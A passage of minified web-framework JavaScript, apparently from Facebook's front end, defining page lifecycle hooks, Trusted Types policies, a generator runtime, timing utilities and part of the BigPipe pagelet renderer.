    window[a] = (window[a] || []).concat(e);
    return {
      remove: function () {
        e.cancel();
      }
    };
  }
  function p(a) {
    window[a] = [];
  }
  var q = c("TimeSlice").guard(function () {
    c("Arbiter").inform(c("PageEvents").NATIVE_DOMREADY, !0, "state");
  }, "DOMContentLoaded");
  a._domcontentready = q;
  function r() {
    var b = document,
      d = window;
    if (b.addEventListener) {
      var e = /AppleWebKit.(\d+)/.exec(navigator.userAgent);
      if (e && e[1] < 525) var f = a.setInterval(function () {
        /loaded|complete/.test(b.readyState) && (q(), a.clearInterval(f));
      }, 10);else b.addEventListener("DOMContentLoaded", q, !0);
    } else {
      e = d.location.protocol === "https:" ? "//:" : "javascript:void(0)";
      b.write('<script onreadystatechange="if (this.readyState==\'complete\') {this.parentNode.removeChild(this);_domcontentready();}" defer="defer" src="' + e + '"></');
      b.write("script>");
    }
    var g = d.onload;
    d.onload = c("TimeSlice").guard(function () {
      g && g(), c("Arbiter").inform(c("PageEvents").NATIVE_ONLOAD, !0, "state");
    }, "window.onload");
    d.onbeforeunload = c("TimeSlice").guard(function (a) {
      var b = {};
      c("Arbiter").inform(c("PageEvents").NATIVE_ONBEFOREUNLOAD, b, "state");
      b.warn || c("Arbiter").inform(c("PageEvents").AJAXPIPE_ONUNLOAD, {
        transition_type: "normal"
      });
      if (b.warn !== void 0) {
        b = b.warn.body != null ? b.warn.body : b.warn;
        a && (a.returnValue = b);
        return b;
      } else return;
    }, "window.onbeforeunload");
  }
  function s() {
    var a,
      b = c("performanceAbsoluteNow")();
    ((a = window.console) == null ? void 0 : a.timeStamp) && window.console.timeStamp('perf_trace {"name": "e2e", "parent": "PageEvents.BIGPIPE_ONLOAD"}');
    c("Arbiter").inform(c("PageEvents").BIGPIPE_ONLOAD, {
      ts: b
    }, "state");
  }
  var t = c("Arbiter").registerCallback(function () {
      d("BigPipeInstance").getCurrentInstance() ? c("Arbiter").subscribeOnce(d("BigPipeInstance").Events.displayed, s) : s();
    }, [c("PageEvents").NATIVE_ONLOAD]),
    u = c("Arbiter").registerCallback(function () {
      var a = {
        timeTriggered: Date.now()
      };
      c("Arbiter").inform(c("PageEvents").BIGPIPE_DOMREADY, a, "state");
    }, [c("PageEvents").NATIVE_DOMREADY]);
  c("ExecutionEnvironment").canUseDOM && r();
  function v() {
    return {
      remove: function () {}
    };
  }
  g.onLoad = b;
  g.onAfterLoad = e;
  g.onBeforeUnload = f;
  g.onUnload = k;
  g.onAfterUnload = l;
  g.onLeave = m;
  g.onCleanupOrLeave = n;
  g.__removeHook = p;
  g.__onloadCallback = t;
  g.__domContentCallback = u;
  g.maybeOnBeforeUnload = v;
}, 98);
__d("TrustedTypesBigPipeMarkupPolicy", ["TrustedTypes"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    createHTML: function (a) {
      return a;
    }
  };
  b = c("TrustedTypes").createPolicy("big-pipe-markup", a);
  d = b;
  g["default"] = d;
}, 98);
__d("TrustedTypesNoOpPolicy_DO_NOT_USE", ["TrustedTypes", "TrustedTypesUtils"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = {
    createScriptURL: d("TrustedTypesUtils").noop,
    createHTML: d("TrustedTypesUtils").noop,
    createScript: d("TrustedTypesUtils").noop
  };
  b = c("TrustedTypes").createPolicy("noop-do-not-use", a);
  e = b;
  g["default"] = e;
}, 98);
__d("TrustedTypesUnsafeFunctionScriptPolicy_DO_NOT_USE", ["Env", "TrustedTypes", "err"], function (a, b, c, d, e, f, g) {
  "use strict";

  d = {
    createScript: function (a) {
      for (var b = arguments.length, d = new Array(b > 1 ? b - 1 : 0), e = 1; e < b; e++) d[e - 1] = arguments[e];
      d.forEach(function (a) {
        if (typeof window !== "undefined" && typeof window.trustedTypes !== "undefined" && !window.trustedTypes.isScript(a)) throw c("err")("Trusted Function requires TrustedScripts args only.");
      });
      var f = d.slice(0, -1).join(","),
        g = d.pop().toString();
      return "(function anonymous(\n     " + f + "\n     ) {\n     " + g + "\n     })";
    }
  };
  var h = c("TrustedTypes").createPolicy("unsafe-function-do-not-use", d);
  function b() {
    for (var b = arguments.length, d = new Array(b), e = 0; e < b; e++) d[e] = arguments[e];
    if (c("TrustedTypes").isSupportedNatively() && c("Env").useTrustedTypes) {
      var f = h.createScript.apply(h, [""].concat(d));
      return a.eval(f);
    } else return babelHelpers.construct(Function, d);
  }
  g.TrustedTypesUnsafeFunctionScriptPolicy_DO_NOT_USE = h;
  g.createTrustedFunction = b;
}, 98);
__d("asyncToGeneratorRuntime", ["Promise"], function (a, b, c, d, e, f) {
  "use strict";

  function g(a, c, d, e, f, g, h) {
    try {
      var i = a[g](h),
        j = i.value;
    } catch (a) {
      d(a);
      return;
    }
    i.done ? c(j) : b("Promise").resolve(j).then(e, f);
  }
  function a(a) {
    return function () {
      var c = this,
        d = arguments;
      return new (b("Promise"))(function (b, e) {
        var f = a.apply(c, d);
        function h(a) {
          g(f, b, e, h, i, "next", a);
        }
        function i(a) {
          g(f, b, e, h, i, "throw", a);
        }
        h(void 0);
      });
    };
  }
  f.asyncToGenerator = a;
}, 66);
__d("regeneratorRuntime", ["Promise"], function (a, b, c, d, e, f) {
  "use strict";

  var g = Object.prototype.hasOwnProperty,
    h = typeof Symbol === "function" && (typeof Symbol === "function" ? Symbol.iterator : "@@iterator") || "@@iterator",
    i = e.exports;
  function j(a, b, c, d) {
    b = Object.create((b || q).prototype);
    d = new z(d || []);
    b._invoke = w(a, c, d);
    return b;
  }
  i.wrap = j;
  function k(a, b, c) {
    try {
      return {
        type: "normal",
        arg: a.call(b, c)
      };
    } catch (a) {
      return {
        type: "throw",
        arg: a
      };
    }
  }
  var l = "suspendedStart",
    m = "suspendedYield",
    n = "executing",
    o = "completed",
    p = {};
  function q() {}
  function r() {}
  function s() {}
  var t = s.prototype = q.prototype;
  r.prototype = t.constructor = s;
  s.constructor = r;
  r.displayName = "GeneratorFunction";
  function a(a) {
    ["next", "throw", "return"].forEach(function (b) {
      a[b] = function (a) {
        return this._invoke(b, a);
      };
    });
  }
  i.isGeneratorFunction = function (a) {
    a = typeof a === "function" && a.constructor;
    return a ? a === r || (a.displayName || a.name) === "GeneratorFunction" : !1;
  };
  i.mark = function (a) {
    Object.setPrototypeOf ? Object.setPrototypeOf(a, s) : Object.assign(a, s);
    a.prototype = Object.create(t);
    return a;
  };
  i.awrap = function (a) {
    return new u(a);
  };
  function u(a) {
    this.arg = a;
  }
  function v(a) {
    function c(c, f) {
      var g = a[c](f);
      c = g.value;
      return c instanceof u ? b("Promise").resolve(c.arg).then(d, e) : b("Promise").resolve(c).then(function (a) {
        g.value = a;
        return g;
      });
    }
    typeof process === "object" && process.domain && (c = process.domain.bind(c));
    var d = c.bind(a, "next"),
      e = c.bind(a, "throw");
    c.bind(a, "return");
    var f;
    function g(a, d) {
      var e = f ? f.then(function () {
        return c(a, d);
      }) : new (b("Promise"))(function (b) {
        b(c(a, d));
      });
      f = e["catch"](function (a) {});
      return e;
    }
    this._invoke = g;
  }
  a(v.prototype);
  i.async = function (a, b, c, d) {
    var e = new v(j(a, b, c, d));
    return i.isGeneratorFunction(b) ? e : e.next().then(function (a) {
      return a.done ? a.value : e.next();
    });
  };
  function w(a, b, c) {
    var d = l;
    return function (e, f) {
      if (d === n) throw new Error("Generator is already running");
      if (d === o) {
        if (e === "throw") throw f;
        return B();
      }
      while (!0) {
        var g = c.delegate;
        if (g) {
          if (e === "return" || e === "throw" && g.iterator[e] === void 0) {
            c.delegate = null;
            var h = g.iterator["return"];
            if (h) {
              h = k(h, g.iterator, f);
              if (h.type === "throw") {
                e = "throw";
                f = h.arg;
                continue;
              }
            }
            if (e === "return") continue;
          }
          h = k(g.iterator[e], g.iterator, f);
          if (h.type === "throw") {
            c.delegate = null;
            e = "throw";
            f = h.arg;
            continue;
          }
          e = "next";
          f = void 0;
          var i = h.arg;
          if (i.done) c[g.resultName] = i.value, c.next = g.nextLoc;else {
            d = m;
            return i;
          }
          c.delegate = null;
        }
        if (e === "next") d === m ? c.sent = f : c.sent = void 0;else if (e === "throw") {
          if (d === l) {
            d = o;
            throw f;
          }
          c.dispatchException(f) && (e = "next", f = void 0);
        } else e === "return" && c.abrupt("return", f);
        d = n;
        h = k(a, b, c);
        if (h.type === "normal") {
          d = c.done ? o : m;
          var i = {
            value: h.arg,
            done: c.done
          };
          if (h.arg === p) c.delegate && e === "next" && (f = void 0);else return i;
        } else h.type === "throw" && (d = o, e = "throw", f = h.arg);
      }
    };
  }
  a(t);
  t[h] = function () {
    return this;
  };
  t.toString = function () {
    return "[object Generator]";
  };
  function x(a) {
    var b = {
      tryLoc: a[0]
    };
    1 in a && (b.catchLoc = a[1]);
    2 in a && (b.finallyLoc = a[2], b.afterLoc = a[3]);
    this.tryEntries.push(b);
  }
  function y(a) {
    var b = a.completion || {};
    b.type = "normal";
    delete b.arg;
    a.completion = b;
  }
  function z(a) {
    this.tryEntries = [{
      tryLoc: "root"
    }], a.forEach(x, this), this.reset(!0);
  }
  i.keys = function (a) {
    var b = [];
    for (var c in a) b.push(c);
    b.reverse();
    return function c() {
      while (b.length) {
        var d = b.pop();
        if (d in a) {
          c.value = d;
          c.done = !1;
          return c;
        }
      }
      c.done = !0;
      return c;
    };
  };
  function A(a) {
    if (a) {
      var b = a[h];
      if (b) return b.call(a);
      if (typeof a.next === "function") return a;
      if (!isNaN(a.length)) {
        var c = -1;
        b = function b() {
          while (++c < a.length) if (g.call(a, c)) {
            b.value = a[c];
            b.done = !1;
            return b;
          }
          b.value = void 0;
          b.done = !0;
          return b;
        };
        return b.next = b;
      }
    }
    return {
      next: B
    };
  }
  i.values = A;
  function B() {
    return {
      value: void 0,
      done: !0
    };
  }
  z.prototype = {
    constructor: z,
    reset: function (a) {
      this.prev = 0;
      this.next = 0;
      this.sent = void 0;
      this.done = !1;
      this.delegate = null;
      this.tryEntries.forEach(y);
      if (!a) for (a in this) a.charAt(0) === "t" && g.call(this, a) && !isNaN(+a.slice(1)) && (this[a] = void 0);
    },
    stop: function () {
      this.done = !0;
      var a = this.tryEntries[0];
      a = a.completion;
      if (a.type === "throw") throw a.arg;
      return this.rval;
    },
    dispatchException: function (a) {
      if (this.done) throw a;
      var b = this;
      function c(c, d) {
        f.type = "throw";
        f.arg = a;
        b.next = c;
        return !!d;
      }
      for (var d = this.tryEntries.length - 1; d >= 0; --d) {
        var e = this.tryEntries[d],
          f = e.completion;
        if (e.tryLoc === "root") return c("end");
        if (e.tryLoc <= this.prev) {
          var h = g.call(e, "catchLoc"),
            i = g.call(e, "finallyLoc");
          if (h && i) {
            if (this.prev < e.catchLoc) return c(e.catchLoc, !0);else if (this.prev < e.finallyLoc) return c(e.finallyLoc);
          } else if (h) {
            if (this.prev < e.catchLoc) return c(e.catchLoc, !0);
          } else if (i) {
            if (this.prev < e.finallyLoc) return c(e.finallyLoc);
          } else throw new Error("try statement without catch or finally");
        }
      }
    },
    abrupt: function (a, b) {
      for (var c = this.tryEntries.length - 1; c >= 0; --c) {
        var d = this.tryEntries[c];
        if (d.tryLoc <= this.prev && g.call(d, "finallyLoc") && this.prev < d.finallyLoc) {
          var e = d;
          break;
        }
      }
      e && (a === "break" || a === "continue") && e.tryLoc <= b && b <= e.finallyLoc && (e = null);
      d = e ? e.completion : {};
      d.type = a;
      d.arg = b;
      e ? this.next = e.finallyLoc : this.complete(d);
      return p;
    },
    complete: function (a, b) {
      if (a.type === "throw") throw a.arg;
      a.type === "break" || a.type === "continue" ? this.next = a.arg : a.type === "return" ? (this.rval = a.arg, this.next = "end") : a.type === "normal" && b && (this.next = b);
    },
    finish: function (a) {
      for (var b = this.tryEntries.length - 1; b >= 0; --b) {
        var c = this.tryEntries[b];
        if (c.finallyLoc === a) {
          this.complete(c.completion, c.afterLoc);
          y(c);
          return p;
        }
      }
    },
    "catch": function (a) {
      for (var b = this.tryEntries.length - 1; b >= 0; --b) {
        var c = this.tryEntries[b];
        if (c.tryLoc === a) {
          var d = c.completion;
          if (d.type === "throw") {
            var e = d.arg;
            y(c);
          }
          return e;
        }
      }
      throw new Error("illegal catch attempt");
    },
    delegateYield: function (a, b, c) {
      this.delegate = {
        iterator: A(a),
        resultName: b,
        nextLoc: c
      };
      return p;
    }
  };
}, null);
__d("UserTimingUtils", ["performance", "regeneratorRuntime"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = typeof c("performance").mark === "function" && typeof c("performance").clearMarks === "function" && typeof c("performance").measure === "function" && typeof c("performance").clearMeasures === "function",
    i = !1;
  if (h && c("performance").mark != null) {
    var j = "__v3",
      k = {};
    Object.defineProperty(k, "startTime", {
      get: function () {
        i = !0;
      }
    });
    try {
      c("performance").mark(j, k);
    } catch (a) {} finally {
      c("performance").clearMarks(j);
    }
  }
  function a(a) {
    h && c("performance").mark(a);
  }
  function d(a, b, d) {
    d === void 0 && (d = !0);
    if (h) {
      try {
        c("performance").measure(a, b);
      } catch (a) {}
      d && c("performance").clearMarks(b);
      c("performance").clearMeasures(a);
    }
  }
  function e(a) {
    if (h) {
      try {
        a = c("performance").getEntriesByName(a, "mark");
        if (a != null && a.length > 0) return !0;
      } catch (a) {}
      return !1;
    }
  }
  function f(a) {
    if (h) try {
      c("performance").clearMarks(a);
    } catch (a) {}
  }
  function l(a, b) {
    if (i) try {
      c("performance").measure(a, b), c("performance").clearMeasures(a);
    } catch (a) {}
  }
  function m(a, b) {
    i && (c("performance").mark(a, b), c("performance").clearMarks(a));
  }
  function n(a, d) {
    var e, f, g;
    return b("regeneratorRuntime").async(function (h) {
      while (1) switch (h.prev = h.next) {
        case 0:
          e = c("performance").now();
          h.next = 3;
          return b("regeneratorRuntime").awrap(d());
        case 3:
          f = h.sent;
          g = c("performance").now();
          l(a, {
            end: g,
            start: e
          });
          return h.abrupt("return", f);
        case 7:
        case "end":
          return h.stop();
      }
    }, null, this);
  }
  g.measureStart = a;
  g.measureEnd = d;
  g.hasMark = e;
  g.clearMarks = f;
  g.measureModern = l;
  g.markModern = m;
  g.asyncMeasure = n;
}, 98);
__d("captureUsageSnapshot", [], function (a, b, c, d, e, f) {
  "use strict";

  function a() {
    var a = window.__bodyWrapper;
    if (!a.getCodeUsage) return {
      js_calls: {},
      document_html: "",
      stylesheets: {}
    };
    a = babelHelpers["extends"]({}, a.getCodeUsage());
    var b = String(window.document.body.outerHTML),
      c = {};
    Array.from(document.styleSheets).forEach(function (a) {
      a.href && (c[a.href] = !0);
    });
    return {
      js_calls: a,
      document_html: b,
      stylesheets: c
    };
  }
  f["default"] = a;
}, 66);
__d("fastDeepCopy", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return typeof a === "object" && a !== null ? g(a) : a;
  }
  function g(a) {
    var b = typeof a.constructor === "function" ? a.constructor() : {};
    if (Array.isArray(a)) for (var c = 0; c < a.length; ++c) {
      var d = a[c];
      b[c] = typeof d === "object" && d !== null ? g(d) : d;
    } else for (d in a) {
      c = a[d];
      b[d] = typeof c === "object" && c !== null ? g(c) : c;
    }
    return b;
  }
  f["default"] = a;
}, 66);
__d("BigPipe", ["$", "Arbiter", "BigPipeExperiments", "BigPipeInstance", "BigPipePlugins", "Bootloader", "ErrorUtils", "FBLogger", "HasteResponse", "PageEvents", "PageletEventConstsJS", "PageletSet", "RunBlue", "ServerJS", "TimeSlice", "TrustedTypesBigPipeMarkupPolicy", "TrustedTypesNoOpPolicy_DO_NOT_USE", "TrustedTypesUnsafeFunctionScriptPolicy_DO_NOT_USE", "UserTimingUtils", "captureUsageSnapshot", "clearTimeout", "fastDeepCopy", "ge", "performanceAbsoluteNow", "setTimeout"], function (a, b, c, d, e, f, g) {
  a.__bigPipeFactory = c("performanceAbsoluteNow")();
  var h = document.documentMode || +(/MSIE.(\d+)/.exec(navigator.userAgent) || [])[1],
    i = console.timeStamp && window.location.search.indexOf("pagelet_ts=1") > 0;
  function j(a, b) {
    d("UserTimingUtils").measureStart(a + " " + b);
  }
  function k(a, b, c) {
    d("UserTimingUtils").measureEnd("\u26cf " + a + " [" + b + "][phase " + c + "]", a + " " + b);
  }
  function l(a, b) {
    if (a) for (var e = 0; e < a.length; e++) {
      var f = null,
        g = a[e],
        h = g.match(/^\"caller:([^\"]+?)\";(.*)/);
      h != null && (f = h[1], g = h[2]);
      c("ErrorUtils").applyWithGuard(d("TrustedTypesUnsafeFunctionScriptPolicy_DO_NOT_USE").createTrustedFunction(c("TrustedTypesNoOpPolicy_DO_NOT_USE").createScript(g)), b);
      c("FBLogger")("comet_infra").info("BigPipe eval call", f);
    }
  }
  var m = 1;
  b = function () {
    function a(b) {
      var e = this;
      this._onDisplayDone = function (a) {
        e.arbiter.registerCallback(a, ["display_done"]);
      };
      Object.assign(this, {
        arbiter: c("Arbiter"),
        rootNodeID: "content",
        lid: null,
        isAjax: !1,
        domContentCallback: d("RunBlue").__domContentCallback,
        onloadCallback: d("RunBlue").__onloadCallback,
        domContentEvt: c("PageEvents").BIGPIPE_DOMREADY,
        onloadEvt: c("PageEvents").BIGPIPE_ONLOAD,
        forceFinish: !1,
        config: {},
        _currentPhase: 0,
        _lastPhaseOfLastResponse: -1,
        _lastPhaseBeforeLastResponse: -1,
        _livePagelets: {},
        _phases: {},
        _orderedPhases: [],
        _maxPhase: 0,
        _displayDoneFired: !1,
        _displayDone: !1,
        _awaitingLIDEventQueue: []
      }, b);
      this.config || (this.config = {});
      this.automatic ? this._relevant_instance = d("BigPipeInstance").getCurrentInstance() : d("BigPipeInstance").setCurrentInstance_DO_NOT_USE(this);
      this._serverJS = new (c("ServerJS"))();
      this._informEventExternal(a.Events.init, {
        arbiter: this.arbiter
      }, c("Arbiter"));
      this._displayDoneCallback = this.arbiter.registerCallback(function () {
        var b = c("captureUsageSnapshot")();
        e._informEventExternal(a.Events.displayed, {
          rid: e.rid,
          ajax: e.isAjax,
          usageSnapshot: b
        });
      }, ["display_done"]);
      b = ["pagelet_displayed_all"];
      this.config.extra_dom_content_event != null && b.push(this.config.extra_dom_content_event);
      this.arbiter.registerCallback(this.domContentCallback, b);
      this._beginPhase(0);
      this.arbiter.registerCallback(this.onloadCallback, ["bigpipe_e2e_reported"]);
      this._loadedCallback = this.arbiter.registerCallback(function () {
        e._informEventExternal(a.Events.loaded, {
          rid: e.rid,
          ajax: e.isAjax
        }), e.arbiter.inform("bigpipe_e2e_reported", !0);
      }, ["pagelet_displayed_all"]);
      this.arbiter.registerCallback(function () {
        return e._serverJS.cleanup(c("TimeSlice"));
      }, [this.onloadEvt, "bigpipe_e2e_reported"]);
    }
    var b = a.prototype;
    b._beginPhase = function (a) {
      var b = this._getOrCreatePhase(a);
      b.begun = !0;
      this._informEventExternal("phase_begin", {
        phase: a
      });
      this.arbiter.inform("phase_begin_" + a, !0, "state");
    };
    b._getOrCreatePhase = function (a) {
      if (this._phases[a]) return this._phases[a];
      var b = {
        pagelets: [],
        begun: !1,
        complete: !1
      };
      this._phases[a] = b;
      var c = 0;
      while (c < this._orderedPhases.length) {
        if (a < this._orderedPhases[c]) break;
        c++;
      }
      this._orderedPhases.splice(c, 0, a);
      return b;
    };
    b._tryRenderingNextPhase = function () {
      var a = this._phases[this._currentPhase];
      if (a && a.begun && !a.complete) return;
      for (var a = this._orderedPhases, b = Array.isArray(a), c = 0, a = b ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var d;
        if (b) {
          if (c >= a.length) break;
          d = a[c++];
        } else {
          c = a.next();
          if (c.done) break;
          d = c.value;
        }
        d = d;
        var e = this._phases[d];
        if (e.begun) {
          if (e.complete) continue;else return;
        } else {
          this._currentPhase = d;
          this._beginPhase(d);
          return;
        }
      }
    };
    b._displayPageletHandler = function (a) {
      this.displayCallback ? this.displayCallback(this._displayPagelet.bind(this, a)) : this._displayPagelet(a);
    };
    b._displayPagelet = function (a) {
      j(a.id, "display");
      a.displayStarted = !0;
      this._informPageletEvent(c("PageletEventConstsJS").DISPLAY_START, a);
      var b = this._getPagelet(a),
        d = [],
        e = {};
      for (var f in a.content) {
        var g = a.content[f];
        a.append && (f = this._getPageletRootID(a));
        var h = c("ge")(f);
        if (!h || f == null) {
          var i = "Root element %s is missing for pagelet %s";
          continue;
        }
        f === b.id && b.setRoot(h);
        if (g) {
          if (a.append) p(h, g, d);else if (g.nodeType) h.innerHTML = c("TrustedTypesBigPipeMarkupPolicy").createHTML(""), p(h, g, d);else {
            i = n(g);
            h.innerHTML = c("TrustedTypesBigPipeMarkupPolicy").createHTML(i);
            e[f] = i;
            d.push(h);
          }
          c("BigPipeExperiments").enable_bigpipe_plugins && c("BigPipePlugins").runPluginOnPagelet(h);
        }
        g = h.getAttribute("data-referrer");
        g || h.setAttribute("data-referrer", f);
      }
      i = null;
      if (a.static_templates) {
        g = c("ge")("static_templates");
        g && (i = n(a.static_templates), a.replace_static_templates_if_exists && (i = q(g, i, d)), p(g, i, d));
      }
      this._informPageletDisplayDetails(a.id, a.jsmods, e, i);
      a.displayed = !0;
      if (a.jsmods) {
        h = this._serverJS.handlePartial(a.jsmods, {
          pagelet: a.id,
          bigPipeContext: {
            onDisplayDone: this._onDisplayDone
          }
        });
        b.addDestructor(h.cancel.bind(h));
      }
      var l = [];
      d.forEach(function (a) {
        if (typeof a.getElementsByTagName === "function") {
          a = a.getElementsByTagName("img");
          for (var b = 0; b < a.length; b++) l.push(a[b].src);
        }
      });
      l.length > 0 && this._informEventExternal("images_displayed", {
        pagelet: a.id,
        timeslice: c("TimeSlice").getContext() ? c("TimeSlice").getContext().contextID : null,
        images: l
      });
      this._informPageletEvent(c("PageletEventConstsJS").DISPLAY_END, a);
      k(a.id, "display", a.phase);
      this.arbiter.inform(a.id + "_displayed", !0, "state");
    };
    b._onPhaseDisplayEnd = function (b) {
      var d = this._getOrCreatePhase(b);
      d.complete = !0;
      if (b === this._ttiPhase) {
        d = {};
        var e = c("captureUsageSnapshot")();
        this._informEventExternal(a.Events.tti, {
          phase: this._ttiPhase,
          rid: this.rid,
          ajax: this.isAjax,
          metrics: d,
          usageSnapshot: e
        });
        this.arbiter.inform("tti_pagelet_displayed", !0, "state");
      }
      this._isRelevant() && (b === this._lastPhaseBeforeLastResponse && this._fireDisplayDone(function () {}), b === this._lastPhaseOfLastResponse && (this._displayDoneFired || this._fireDisplayDone(function () {}), this.arbiter.inform("pagelet_displayed_all", !0, "state")));
      b !== this._lastPhaseOfLastResponse && this._nextPhase();
    };
    b._nextPhase = function () {
      this.config.flush_pagelets_asap ? h <= 8 ? c("setTimeout")(this._tryRenderingNextPhase.bind(this), 20) : this._tryRenderingNextPhase() : (this._currentPhase++, h <= 8 ? c("setTimeout")(this._beginPhase.bind(this, this._currentPhase), 20) : this._beginPhase(this._currentPhase));
    };
    b._fireDisplayDone = function (a) {
      this._displayDoneFired = !0, this.arbiter.inform("display_done", !0), this._displayDone = !0, a(), this.lid != null && k("display_done", this.lid, "all");
    };
    b._downloadJsForPagelet = function (a) {
      var b = this;
      this._informPageletEvent(c("PageletEventConstsJS").JS_START, a);
      c("Bootloader").loadResources(a.allResources || [], {
        onAll: function () {
          b._informPageletEvent(c("PageletEventConstsJS").JS_END, a);
          a.requires = a.requires || [];
          (!b.isAjax || a.phase >= 1) && a.requires.push("uipage_onload");
          var d = function () {
              b._informPageletEvent(c("PageletEventConstsJS").ONLOAD_START, a), b._isRelevantPagelet(a) && l(a.onload), b._informPageletEvent(c("PageletEventConstsJS").ONLOAD_END, a), b.arbiter.inform("pagelet_onload", !0), a.provides && b.arbiter.inform(a.provides, !0, "state");
            },
            e = function () {
              b._isRelevantPagelet(a) && l(a.onafterload);
            };
          b.arbiter.registerCallback(d, a.requires);
          b.arbiter.registerCallback(e, [b.onloadEvt]);
        }
      });
    };
    b._getPagelet = function (a) {
      a = this._getPageletRootID(a);
      return d("PageletSet").getPagelet(a);
    };
    b._getPageletRootID = function (a) {
      return a.append || Object.keys(a.content)[0] || null;
    };
    b._isRelevant = function () {
      var a = d("BigPipeInstance").getCurrentInstance();
      return this == a || this.automatic && this._relevant_instance == a || this.jsNonBlock || this.forceFinish || a && a.allowIrrelevantRequests;
    };
    b._isRelevantPagelet = function (a) {
      if (!this._isRelevant()) return !1;
      a = this._getPageletRootID(a);
      return !!this._livePagelets[a];
    };
    b._informEventExternal = function (a, b, d) {
      b = b || {}, d = d || this.arbiter, b.ts || (b.ts = c("performanceAbsoluteNow")()), i && console.timeStamp && console.timeStamp(a + " " + (Object.prototype.hasOwnProperty.call(b, "arbiter") ? JSON.stringify(babelHelpers["extends"]({}, b, {
        arbiter: null
      })) : JSON.stringify(b))), this.lid === null ? this._awaitingLIDEventQueue.push([d, a, b]) : (b.lid = this.lid, d.inform(a, b, "persistent"));
    };
    b._informPageletEvent = function (a, b, c) {
      a = {
        event: a,
        id: b.id,
        ts: c
      };
      b.phase && (a.phase = b.phase);
      b.categories && (a.categories = b.categories);
      b.allResources && (a.allResources = b.allResources);
      b.displayResources && (a.displayResources = b.displayResources);
      this._informEventExternal("pagelet_event", a);
    };
    b._informPageletDisplayDetails = function (a, b, d, e) {
      if (this.config.dispatch_pagelet_replayable_actions) try {
        this._informEventExternal("pagelet_performing_replayable_actions", {
          id: a,
          jsmods: c("fastDeepCopy")(b),
          contentMap: d,
          staticTemplates: e
        });
      } catch (a) {
        c("FBLogger")("bigpipe_pagelet_replay").catching(a).warn("failed at _informPageletDisplayDetails"), this._informEventExternal("pagelet_performing_replayable_actions_failed", {});
      }
    };
    a.getCurrentInstance = function () {
      return d("BigPipeInstance").getCurrentInstance();
    };
    return a;
  }();
  Object.assign(b.prototype, {
    beforePageletArrive: function (a, b) {
      var d = this;
      c("TimeSlice").guard(function () {
        return d._informPageletEvent(c("PageletEventConstsJS").ARRIVE_START, {
          id: a
        }, b);
      }, "beforePageletArrive " + a, {
        root: !0
      })();
    },
    setPageID: function (a) {
      this.lid = a, this._awaitingLIDEventQueue.forEach(function (b) {
        var c = b[0],
          d = b[1];
        b = b[2];
        b.lid = a;
        c.inform(d, b, "persistent");
      }), this._awaitingLIDEventQueue = [], this.lid && j("display_done", this.lid);
    },
    onPageletArrive: c("ErrorUtils").guard(function (a) {
      var b,
        e = this;
      this._informPageletEvent(c("PageletEventConstsJS").ARRIVE_END, a);
      d("HasteResponse").handleSRPayload((b = a.hsrp) != null ? b : {});
      a.content = a.content || {};
      var f = a.phase;
      if (a.all_phases) for (var b = a.all_phases, g = Array.isArray(b), h = 0, b = g ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var i;
        if (g) {
          if (h >= b.length) break;
          i = b[h++];
        } else {
          h = b.next();
          if (h.done) break;
          i = h.value;
        }
        i = i;
        this._getOrCreatePhase(i);
      }
      i = this._getOrCreatePhase(f);
      i.pagelets.push(a.id);
      this._maxPhase = Math.max(f, this._maxPhase);
      a.last_in_phase && this.arbiter.registerCallback(function () {
        return e._onPhaseDisplayEnd(f);
      }, i.pagelets.map(function (a) {
        return a + "_displayed";
      }).concat(["phase_begin_" + f]));
      h = this._getPageletRootID(a);
      var j = d("PageletSet").getOrCreatePagelet(h);
      a.last_pagelet && (this._lastPhaseBeforeLastResponse = this._maxPhase);
      a.the_end && (this._lastPhaseOfLastResponse = f);
      a.tti_phase !== void 0 && (this._ttiPhase = a.tti_phase);
      this._livePagelets[j.id] = !0;
      j.addDestructor(function () {
        delete e._livePagelets[j.id];
      });
      var k,
        l = [];
      if (a.jsmods) {
        g = a.jsmods.define;
        b = a.jsmods.instances;
        i = a.jsmods.markup;
        h = a.jsmods.pre_display_requires;
        delete a.jsmods.define;
        delete a.jsmods.instances;
        delete a.jsmods.markup;
        delete a.jsmods.pre_display_requires;
        var n = 19e3;
        n = function () {
          if (a.displayStarted === !0) {
            c("FBLogger")("BigPipe").warn("registerToBlockDisplayUntilDone_DONOTUSE called after pagelet %s was displayed. This is a no-op.", a.id);
            return function () {};
          }
          var b,
            d,
            f = m + "_preDisplayEvent";
          m++;
          k ? e.arbiter.registerCallback(k, [f]) : l.push(f);
          return c("TimeSlice").guard(function () {
            d = !0, c("clearTimeout")(b), e.arbiter.inform(f, !0, "state");
          }, "BigPipeDisplayBlockingEvent " + f, {
            propagationType: c("TimeSlice").PropagationType.EXECUTION
          });
        };
        this._informPageletDisplayDetails(a.id, {
          define: g,
          instances: b,
          markup: i,
          pre_display_requires: h
        }, {});
        this._serverJS.handlePartial({
          define: g,
          instances: b,
          markup: i,
          pre_display_requires: h
        }, {
          pagelet: a.id,
          bigPipeContext: {
            onDisplayDone: this._onDisplayDone,
            registerToBlockDisplayUntilDone_DONOTUSE: n
          }
        });
      }
      this.arbiter.registerCallback(this._loadedCallback, ["pagelet_onload"]);
      this._informPageletEvent(c("PageletEventConstsJS").SETUP, a);
      if (a.display_out_of_phase === "asap") l = l.concat(["first_response_displayed", a.id + "_css_end"]);else if (a.display_out_of_phase === "after_tti") {
        var o = a.id + "_greedy_render";
        l = l.concat(["first_response_displayed", a.id + "_css_end", o]);
        var p = !1;
        g = function () {
          if (p) return;
          e.arbiter.inform(o, !0, "state");
        };
        this.arbiter.registerCallback(g, ["tti_pagelet_displayed"]);
        this.arbiter.registerCallback(g, ["phase_begin_" + f]);
      } else l = l.concat(["phase_begin_" + a.phase, a.id + "_css_end"]);
      (a.display_dependency || []).forEach(function (a) {
        return l.push(a + "_displayed");
      });
      if (a.display_group) {
        b = document.body.getElementsByClassName("pagelet-group");
        for (i = 0; i < b.length; i++) {
          h = b[i];
          if (h.id === a.id) break;
          h.getAttribute("data-display-group") === a.display_group && l.push(h.id + "_displayed");
        }
      }
      k = this.arbiter.registerCallback(function () {
        a.display_delay_ms === void 0 ? e._displayPageletHandler(a) : c("setTimeout")(function () {
          return e._displayPageletHandler(a);
        }, a.display_delay_ms);
